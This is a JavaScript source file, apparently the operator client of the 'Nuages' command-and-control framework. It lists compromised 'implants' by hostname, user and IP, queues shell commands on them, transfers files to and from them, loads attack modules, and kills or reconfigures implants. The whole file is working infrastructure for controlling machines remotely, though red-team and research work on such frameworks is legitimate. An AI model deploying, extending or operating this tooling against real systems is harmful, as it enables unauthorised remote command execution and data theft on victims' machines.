const feathers = require('@feathersjs/client');
const socketio = require('@feathersjs/socketio-client');
var path = require("path");
var fs = require("fs");
const io = require('socket.io-client');
var endpoint = process.argv[2] ? process.argv[2]  : "http://127.0.0.1:3030";
const socket = io(endpoint);
const term = require("./term").term;
const app = feathers();

var nuages = {};

app.configure(feathers.authentication({}));

app.configure(feathers.socketio(socket));
nuages.implantService = app.service('implants');
nuages.jobService = app.service('jobs');
nuages.fsService = app.service('fs');
nuages.fileService = app.service('/fs/files');
nuages.chunkService = app.service('/fs/chunks');
nuages.modrunService = app.service('/modules/run');
nuages.moduleService = app.service('/modules');
nuages.modloadService = app.service('/modules/load');
nuages.fsService.timeout = 20000000;
nuages.chunkService.timeout = 20000000;

nuages.vars = { 
    implants: {},
    paths:{},
    files: {},
    modules: {},
    jobs: {},
    module: ""
};
nuages.vars.globalOptions = {
        implant: 0,
        //path : ".",
        chunksize: 2400000,
        timeout: "1",
};
    
nuages.vars.moduleOptions = {};

function makeid(length) { //Not made to be secure - just to differentiates sessions as we are only using one user
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

nuages.login = async function(user,password){
    try {
        await app.logout();
        nuages.vars.user = {email: user, password: password}
        const payload = Object.assign({ strategy: 'local' }, nuages.vars.user);
        await app.authenticate(payload);
        term.logSuccess("Authentication Successful", user.email);
        nuages.getImplants();
        nuages.getModules(false);
        nuages.vars.session = makeid(32);
    } catch(error) {
    // If we got an error, show the login page
        term.logError(error.message);
    }
}

nuages.printImplants= function (imp){
    var imps = Object.values(imp);
    if(imps.length == 0 ){return;}
    var result = "\r\n ID     | OS      | Hostname       | Username      | Local IP       | Handler    | Last Seen\r\n";
    result += "".padEnd(101,"-") + "\r\n";
    var implant;
    var string;
    for (var i=0; i < imps.length; i ++){
        string = ""
        try{
            implant = imps[i];
            string += " " + term.toBold(term.toBlue(implant._id.toString().substring(0,6).padEnd(7, ' '))) + "| ";
            string += implant.os.substring(0, 7).padEnd(8, ' ') + "| ";
            string += implant.hostname.substring(0,14).padEnd(15, ' ') + "| ";
            string += implant.username.substring(0,13).padEnd(14, ' ') + "| ";
            string += implant.localIp.substring(0,14).padEnd(15, ' ') + "| ";
            string += implant.handler.substring(0,10).padEnd(11, ' ') + "| ";
            string += new Date(implant.lastSeen).toLocaleDateString('en-GB', {day : 'numeric', month : 'numeric', hour: 'numeric', minute: "numeric", second: "numeric"});
        }catch(e){
            console.error(e)
        }
        result+=string+"\r\n";
    }
    return result;
}

nuages.humanFileSize = function(size) {
    if(size==0){
        return "0";
    }
    var i = Math.floor( Math.log(size) / Math.log(1024) );
    return ( size / Math.pow(1024, i) ).toFixed(2) * 1 + ' ' + ['B', 'kB', 'MB', 'GB', 'TB'][i];
};

nuages.printFiles = function(files){
    var files = Object.values(files);
    if(files.length == 0 ){return "";}
    result = "\r\n ID     | Size      | ChunkSize | Uploaded By | Upload Date      | Name \r\n";
    result += "".padEnd(90,"-") + "\r\n";
    var file;
    var string = "";
    for (var i=0; i < files.length; i ++){
        try{
            file = files[i];
            string = "";
            var uploadedBy = file.metadata.uploadedBy ? file.metadata.uploadedBy.substring(0,6) : "";
            string += " " + file._id.toString().substring(0,6).padEnd(7, ' ') + "| ";
            string += nuages.humanFileSize(Math.floor(file.length*3/4)).padEnd(10, ' ') + "| ";
            string += file.chunkSize.toString().substring(0,9).padEnd(10, ' ') + "| ";
            string += " " + uploadedBy.padEnd(11, ' ') + "| ";
            string += new Date(file.uploadDate).toLocaleDateString('en-GB', {day : 'numeric', month : 'numeric', hour: 'numeric', minute: "numeric", second: "numeric"}) + " | ";
            string += file.filename.substring(0,30)+"\r\n";
            result+=string;
        }catch(e){
        };
    }
    return result;
}

nuages.printModules = function(modules){
    var modules = Object.values(modules);
    if(modules.length == 0 ){return "";}
    result = "\r\n Name                                              | Required OS         | Description \r\n";
    result += "".padEnd(90,"-") + "\r\n";
    var module;
    var string = "";
    for (var i=0; i < modules.length; i ++){
        try{
            mod = modules[i];
            string = "";
            string += " " + mod.name.substring(0,50).padEnd(50, ' ') + "|";
            string += " " + mod.supportedOS.join(" ").substring(0,20).padEnd(20, ' ') + "|";
            string += " " + mod.description.substring(0,40)+"\r\n";
            result+=string;
        }catch(e){
        };
    }
    return result;
}

nuages.printJobs = function(jobs){
    const statusCodes = ["Pending  ", "Received ", "Running  ", term.toGreen("Success  "), term.toRed("Failed   ")];
    var jobs = Object.values(jobs);
    if(jobs.length == 0 ){return;}
    result = "\r\n Implant | ID     | Status   | Last Updated      | Type      | Options                   | Result \r\n";
    result += "".padEnd(100,"-") + "\r\n";
    var job;
    var dispOption = "";
    var string;
    for (var i=0; i < jobs.length; i ++){
        try{
            string = ""
            job = jobs[i];
            if(job.payload.type == "Command"){
                dispOption = job.payload.options.cmd;
            }else if (job.payload.type == "Upload" || job.payload.type == "Download"){
                dispOption = job.payload.options.file;
            }else if (job.payload.type == "Configure"){
                dispOption = JSON.stringify(job.payload.options.config);
            }else{
                dispOption = JSON.stringify(job.payload.options);
            }
            string += " " + term.toBlue(job.implantId.toString().substring(0,6)) + "  | ";
            string += job._id.toString().substring(0,6) + " | ";
            string += statusCodes[job.jobStatus] + "| ";
            string += new Date(job.lastUpdated).toLocaleDateString('en-GB', {day : 'numeric', month : 'numeric', hour: 'numeric', minute: "numeric", second: "numeric"}).padEnd(18," ") + "|";
            string += " " + job.payload.type.toString().substring(0,9).padEnd(10, ' ')+"|";
            string += " " + dispOption.substring(0,25).padEnd(26, ' ')+"|";
            string += " " + job.result.replace(/\n|\r/g, "").substring(0,28)+"\r\n";
            result += string;
        }catch(e){
            console.error(e);
        }
    }
    return result;
}

nuages.printOptions = function(){
    string = "\r\n ["+term.toBold(term.toBlue("Global"))+"]"
    string += "\r\n Name          | Value          \r\n"
    string += "".padEnd(60,"-") + "\r\n";
    string += " Implant       | " + nuages.vars.globalOptions.implant.toString() +"\r\n";
    string += " Chunk Size    | " + nuages.vars.globalOptions.chunksize.toString() +"\r\n";
    string += " Timeout (min) | " + nuages.vars.globalOptions.timeout.toString() +"\r\n";
    //string += " Path          | " + nuages.vars.globalOptions.path;
    term.writeln(string);
    if(nuages.vars.modules[nuages.vars.module]!=undefined){
        string = "\r\n ["+term.toBold(term.toMagenta("Module"))+"]"
        string += "\r\n Name             | Required |   Value                                  | Description \r\n"
        string += "".padEnd(100,"-") + "\r\n";
        var optionKeys = Object.keys(nuages.vars.moduleOptions);
        for(var i = 0; i < optionKeys.length; i++){
            string += " " +optionKeys[i].substr(0,16).padEnd(17," ")+"| " + nuages.vars.moduleOptions[optionKeys[i]].required.toString().padEnd(9," ")+"| " + nuages.vars.moduleOptions[optionKeys[i]].value.substr(0,40).padEnd(41," ")+"| " + nuages.vars.moduleOptions[optionKeys[i]].description + "\r\n";
        }
        term.writeln(string);	
    }
}

nuages.getImplants = async function(){
    nuages.vars.implants = {};
    nuages.implantService.find({query: {$limit: 200}}).then(items => {
        for(var i = 0; i< items.data.length; i++){
            nuages.vars.implants[items.data[i]._id.substring(0,6)] = items.data[i]
        }; 
            term.logInfo("Implants:\r\n" + nuages.printImplants(items.data)); 
        }).catch((err) => {
            term.logError(err.message);
        });
    
}

nuages.getModules = function(print = true){
    nuages.vars.modules = {};
    nuages.moduleService.find({query: {$limit: 200}}).then(items => {
        for(var i = 0; i< items.data.length; i++){
            nuages.vars.modules[items.data[i].name] = items.data[i]
        }; 
            if(print){
                term.logInfo("Modules:\r\n" + nuages.printModules(items.data)); 
            }
        }).catch((err) => {
            term.logError(err.message);
        });
}

nuages.getFiles = async function(){
    nuages.vars.files = {};
    try{
        items = await nuages.fileService.find({query: {$limit: 200}});
        }catch(e){term.printError(e); return}
    for(var i = 0; i< items.data.length; i++){
        nuages.vars.files[items.data[i]._id.substring(0,6)] = items.data[i]
    };
    term.logInfo("Files:\r\n" + nuages.printFiles(items.data)); 
}

nuages.getJobs = async function(){
    try{
        items = await nuages.jobService.find({query: {$limit: 15, $sort: { lastUpdated: -1 }}});
        }catch(e){term.printError(e);}
    for(var i = 0; i< items.data.length; i++){
        nuages.vars.jobs[items.data[i]._id.substring(0,6)] = items.data[i]
    };
    term.logInfo("Jobs:\r\n" + nuages.printJobs(items.data)); 
}

nuages.createJob = function (implant, payload){
    var timeout = Date.now() + parseInt(nuages.vars.globalOptions.timeout) * 60000;
    if (nuages.vars.implants[implant] != undefined){
        nuages.jobService.create({
            implantId: nuages.vars.implants[implant]._id,
            timeout: timeout,
            vars: {session: nuages.vars.session},
            payload: payload}
            ).catch((err) => {
                term.logError(err.message);
            });
    }else{
        //term.logError("Implant not found: !setg implant <ID> or !shell <ID>");
    }
}

nuages.processJobPatched = function (job){
    if(job.moduleRun !== undefined){
        return;
    }
    if(job.vars.session === undefined || job.vars.session != nuages.vars.session){
        return;
    }
    if(job.payload.type=="Command" && job.payload.options.cd == true && job.result){
        if(job.result.split('\n').length > 3){
            nuages.vars.paths[job.implantId.substring(0,6)] = job.result.split('\n')[2].trim();
        }else{
            term.logError("Path not found");
        }
        term.reprompt();
    }
    else if(job.jobStatus == 4){
        if(job.payload.type=="Command"){
            term.logError("Failed command: " + job.payload.options.cmd +"\r\n" + job.result, job.implantId.substring(0,6));
        }else{
            term.logError(job.payload.type + " failed:\r\n " + job.result, job.implantId.substring(0,6));
        }
    }
    else if(job.jobStatus == 3){
        if(job.payload.type=="Command"){
            term.logSuccess("Received result for command: " + job.payload.options.cmd +"\r\n" + job.result, job.implantId.substring(0,6));
        }
        else {
            term.logSuccess(job.payload.type + " succeeded:" +"\r\n" + job.result, job.implantId.substring(0,6));
        }
    }
}

nuages.dataURLtoBlob  = function (dataurl) {
    var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
    bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
    while(n--){
    u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], {type:mime});
}

nuages.exportToFile  = function (b64, fileName) {
    //const u8arr = new TextEncoder('utf-8').encode(JSON.stringify(jsonData, null, 2));
    const url = window.URL.createObjectURL(dataURLtoBlob("data:application/octet-stream;base64,"+b64));
    const element = document.createElement('a');
    element.setAttribute('href', url);
    element.setAttribute('download', fileName);
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
}

nuages.printModRunLog  = function (modRun){
    if(modRun.log.length > 0){
        var logEntry = modRun.log[modRun.log.length - 1];
        if (logEntry.type == 0){
            term.logInfo(logEntry.message, modRun.moduleName);
        }else if(logEntry.type == 1){
            term.logError(logEntry.message, modRun.moduleName);
        }else{
            term.logSuccess(logEntry.message, modRun.moduleName);
        }
            
    }
}

nuages.printHelp  = function (){
    var string = "\r\n";
    string += " !login <username>                       - Login to Nuages\r\n" ;
    string += " !implants                               - List implants\r\n";
    string += " !implants <id>                          - Show an implant\r\n";
    string += " !implants <id> del                      - Delete an implant\r\n";
    string += " !implants <id> kill                     - Kill an implant\r\n";
    string += " !implants <id> config                   - Get the configuration from the implant\r\n";
    string += " !implants <id> config <option> <value>  - Reconfigure the implant\r\n";
    string += " !implant [Command..]                    - Apply the command to the current implant\r\n";
    string += " !shell <implant>                        - Start interracting with an implant\r\n" ;
    string += " !put <fileId> [path]                    - Start a download job on the current implant\r\n";
    string += " !get <path>                             - Start an upload job on the current implant\r\n";
    string += " cd <path>                               - Change path on the current implant\r\n";
    string += " !files upload <path>                    - Upload a file from the local client\r\n";
    string += " !files <id> download <path>             - Download a file to the local client\r\n";
    string += " !files <id> del                         - Delete a file\r\n";
    string += " !options                                - Show options\r\n" ;
    string += " !setg <option> <value>                  - Set a global option\r\n" ;
    string += " !set <option> <value>                   - Set a module option\r\n" ;
    string += " !use <path>                             - Select a module\r\n";
    string += " !modules load <path>                    - Load a module\r\n";
    string += " !modules <path> del                     - Delete a module\r\n";
    string += " !jobs                                   - Display the last jobs\r\n";
    string += " !jobs  <id>                             - Display a job and its result\r\n";
    string += " !help                                   - Print this message\r\n";

    term.printInfo(string, "Help")
}

nuages.chunkSubstr  = function (str, size) {
    const numChunks = Math.ceil(str.length / size)
    const chunks = new Array(numChunks)

    for (let i = 0, o = 0; i < numChunks; ++i, o += size) {
      chunks[i] = str.substr(o, size)
    }

    return chunks
  }

  nuages.loadFile = async function(filePath) {
    var CHUNK_SIZE = parseInt(nuages.vars.globalOptions.chunksize) * 3/4;
    buffer = new Buffer(CHUNK_SIZE);
    fs.open(filePath, 'r', async function(err, fd) {
        if (err) {term.logError(err.message); return};
        var file = await nuages.fileService.create({filename: path.basename(filePath), chunkSize: parseInt(nuages.vars.globalOptions.chunksize) , length: 0, metadata:{path:"N/A"}}).catch((err) => {
            term.logError(err.message);
        });
        if (!file){return;}
        var n = 0;
        async function readNextChunk() {
          fs.read(fd, buffer, 0, CHUNK_SIZE, null, async function(err, nread) {
            if (err) throw err;
            if (nread === 0) {
                nuages.fsService.patch(file._id,{}).catch((err) => {
                    term.logError(err.message);
                });	
                fs.close(fd, function(err) {
                    if (err) throw err;
                });
                return;
            }
      
            var data;
            if (nread < CHUNK_SIZE)
              data = buffer.slice(0, nread);
            else
              data = buffer;
              // We dont really have to wait but lets spare the server
              await nuages.chunkService.create({files_id: file._id, n: n, data:data.toString('base64')}).catch((err) => {
                term.logError(err.message);
                return;
            });	
            n++;
            readNextChunk();
          });

        }
        readNextChunk();
      });
}

nuages.downloadFile = async function(fileId, filePath){
    if (nuages.vars.files[fileId] != undefined){
        nuages.fileService.get(nuages.vars.files[fileId]._id).then(async function(result) {
            try{
            var arraySize = Math.floor(result.length/result.chunkSize);
            if (result.length != arraySize * result.chunkSize){
                arraySize++;
            }
            filePath = !(fs.existsSync(filePath) && fs.lstatSync(filePath).isDirectory()) ? filePath : path.resolve(filePath, result.filename);
            var writeStream = fs.createWriteStream(filePath);
            for(var i = 0; i < arraySize; i ++){
                await nuages.chunkService.find({query: {
                    n: i,
                    files_id: nuages.vars.files[fileId]._id
                    }}).then( function(result) {
                        var buf = Buffer.from(result.data[0].data, 'base64');
                        writeStream.write(buf);
                    }).catch((e) =>{
                        term.logError(e.message);
                        writeStream.close();
                        return;
                    });
            }
            writeStream.close();
            term.logInfo(filePath + " downloaded");
        }catch(e){term.logError(e.message);}
        });
    }else{
        term.logError("File not found");
    }
};

nuages.jobService.on('patched', job => nuages.processJobPatched(job));
nuages.implantService.on('created', function(implant){nuages.vars.implants[implant._id.substring(0,6)] = implant; term.logInfo("New Implant:\r\n" + nuages.printImplants({imp: implant}));});
nuages.implantService.on('patched', function(implant){nuages.vars.implants[implant._id.substring(0,6)] = implant});
nuages.implantService.on('removed', function(implant){delete nuages.vars.implants[implant._id.substring(0,6)]; term.logInfo("Deleted Implant:\r\n" + nuages.printImplants({imp: implant}));});
nuages.fsService.on('patched', function(file){nuages.vars.files[file._id.substring(0,6)] = file; if(file.complete){term.logInfo("New File:\r\n" + nuages.printFiles({imp: file}));}});
nuages.fsService.on('removed', function(file){term.logInfo("Deleted file:\r\n" + nuages.printFiles({imp: nuages.vars.files[file.id.substring(0,6)]}));delete nuages.vars.files[file.id.substring(0,6)];});
nuages.modrunService.on('patched', function(run){nuages.printModRunLog(run)});
nuages.moduleService.on('created', function(mod){term.logInfo("Module loaded:\r\n" + nuages.printModules({mod: mod}));nuages.vars.modules[mod.name]=mod;});

exports.nuages = nuages;
